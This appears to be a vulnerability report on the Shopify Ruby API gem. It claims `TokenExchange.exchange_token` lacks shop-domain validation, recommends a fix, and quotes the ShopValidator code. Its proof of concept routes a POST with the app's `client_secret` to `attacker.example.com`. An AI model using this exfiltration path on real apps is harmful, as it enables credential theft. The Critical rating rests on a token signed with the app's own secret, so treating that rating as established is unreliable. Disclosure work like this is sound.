This is the key finding worth reporting: `ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop entirely from the unauthenticated-at-that-point `dest` claim of a JWT that is only validated for signature/`aud`, but never checks that `dest` corresponds to a real, trusted Shopify domain the way every sibling method (`migrate_to_expiring_token`, `RefreshToken.refresh_access_token`, `ClientCredentials.client_credentials`) does via `Utils::ShopValidator.sanitize!`.

### Title
Missing shop-domain validation in `TokenExchange.exchange_token` lets an unbound `dest` claim route the app's `client_secret` to an attacker-chosen host - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`TokenExchange.exchange_token` builds the outbound OAuth token-exchange request host directly from `jwt_payload.shop` (the JWT's `dest` claim) without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-issuing method in the same file and module.

### Finding Description
`JwtPayload#initialize` only verifies the token's HMAC signature and that `aud == Context.api_key` [1](#0-0) . It does not constrain `dest` to any Shopify-owned domain format; `shop`/`shopify_domain` is simply `@dest.gsub("https://", "")` [2](#0-1) .

`exchange_token` takes this unchecked `dest_shop` value and uses it to construct the `Session` whose `shop` becomes the host that `Clients::HttpClient` connects to (`@base_uri = "https://#{api_host || session.shop}"`), and that request body includes `client_secret: ShopifyAPI::Context.api_secret_key` [3](#0-2) [4](#0-3) .

Contrast this with the three sibling functions in the very same auth namespace, which all call `Utils::ShopValidator.sanitize!(shop)` before building the request host: `migrate_to_expiring_token` [5](#0-4) , `RefreshToken.refresh_access_token` [6](#0-5) , and `ClientCredentials.client_credentials` [7](#0-6) . `ShopValidator.sanitize!` restricts the resolved host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) or an explicitly configured custom domain [8](#0-7) .

The binding this breaks: **the host that receives `client_secret` must equal the shop claim that was verified as belonging to Shopify's trusted domain set**, i.e. `request_host == ShopValidator(dest_shop)`. In `exchange_token`, the equality actually enforced is only `request_host == dest_shop` (raw, unsanitized), which is weaker — nothing here ties `dest_shop` to a Shopify-owned host name/suffix.

### Impact Explanation
Because `JwtPayload` only checks signature + `aud`, and `TokenExchange.exchange_token` never re-validates that the resulting host is on a Shopify-trusted domain, any value present in `dest` (as long as it produces a token signed with the app's own `api_secret_key` — which the app itself uses to *sign outgoing* session tokens in some host-app integration patterns, or which could otherwise reach this path through host-application logic that trusts and forwards a `dest`/session token whose provenance is not itself cryptographically tied to a real Shopify domain) is used verbatim as the destination for a POST containing the plaintext `client_secret`. This matches the Critical-tier impact class: SSRF that carries the app's own `client_secret` to a host of the caller's choosing, which is theft of the app's `client_secret`.

### Likelihood Explanation
Exploitability hinges on the caller/host application supplying a session token whose `dest` is not otherwise constrained to a real merchant `*.myshopify.com` domain before reaching `exchange_token` (e.g., non-strict verification paths, or reliance on this library being the last line of defense as its sibling functions clearly assume it should be, given they all call `ShopValidator.sanitize!`). The library's own inconsistency — validating shop for `migrate_to_expiring_token`, `refresh_access_token`, and `client_credentials`, but not for `exchange_token` — indicates that shop-domain sanitization was intended as this gem's defense-in-depth measure and was simply omitted for this specific code path.

### Recommendation
In `TokenExchange.exchange_token`, replace the unchecked `dest_shop = jwt_payload.shop` usage with `validated_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)`, and use `validated_shop` both for `Session.new(shop:)` and for the final `Session.from(shop:, ...)` call, mirroring `migrate_to_expiring_token`, `RefreshToken.refresh_access_token`, and `ClientCredentials.client_credentials`.

### Proof of Concept
1. Construct/obtain a "session token" whose `dest` claim is set to an attacker-controlled host (e.g. `https://attacker.example.com`) rather than a `*.myshopify.com` domain, and whose signature and `aud` pass `JwtPayload` validation for the target app's context (i.e., any flow where such a token reaches `exchange_token` without prior domain-restriction, e.g. a host app that decodes/forwards a `dest`/session-token value it received from a non-Shopify-guaranteed source).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. Observe that `Clients::HttpClient` builds `@base_uri = "https://attacker.example.com"` from `session.shop` [9](#0-8)  and issues `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_secret: ShopifyAPI::Context.api_secret_key` [10](#0-9) , exfiltrating the app's `client_secret` to the attacker's server — whereas the sibling `migrate_to_expiring_token`/`refresh_access_token`/`client_credentials` methods would reject such a `shop` value via `ShopValidator.sanitize!` before ever building the request.

      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
